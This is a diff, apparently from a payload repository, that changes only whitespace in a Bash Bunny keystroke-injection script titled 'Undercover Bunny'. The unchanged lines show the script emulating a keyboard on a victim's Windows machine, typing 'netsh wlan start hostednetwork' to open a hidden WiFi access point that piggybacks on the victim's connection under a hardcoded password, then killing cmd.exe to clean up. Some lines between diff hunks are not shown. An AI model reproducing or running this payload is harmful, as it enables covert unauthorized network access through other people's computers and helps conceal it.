@@ -1,5 +1,5 @@
 
- 
+
 # Title: Undercover Bunny (it sounds cool)
 # Description: Creates a WiFi network that piggyback's off of the victim's current connection using CMD
 # Author: hkessel1
@@ -10,29 +10,29 @@
 
 ----------------------------------------
                  LEDS
-Magenta solid = setting up 
+Magenta solid = setting up
 White fast = cleaning up
 Green 1000ms VERYFAST blink followed by SOLID = you have completed the mission
 ----------------------------------------
- 
-################## Options ###################                                                                        
+
+################## Options ###################
 # Bash Bunny name
-bbname=BashBunny                                                                           
-                                     
-# Access point name                                  
+bbname=BashBunny
+
+# Access point name
 apname=yummy_bunny
-                                     
-# Access point password                                                      
+
+# Access point password
 password=hak5bunny
- 
+
 # Millaseconds to clean up (and stpo) script after "Start network" is executed (+0.250 seconds)
 xeject=120000
- 
- 
+
+
 ################## Options ####################
- 
- 
- 
+
+
+
 # Start network
 ATTACKMODE HID
 LED SETUP
@@ -49,8 +49,8 @@ Q DELAY 100
 Q STRING netsh wlan start hostednetwork
 Q DELAY 150
 Q ENTER
- 
- 
+
+
 # Begin cleanup
 LED CLEANUP
 Q GUI r
@@ -66,8 +66,8 @@ Q DELAY 100
 Q STRING taskkill /IM cmd.exe
 Q DELAY 50
 Q ENTER
- 
- 
- 
- 
+
+
+
+
 LED FINISH
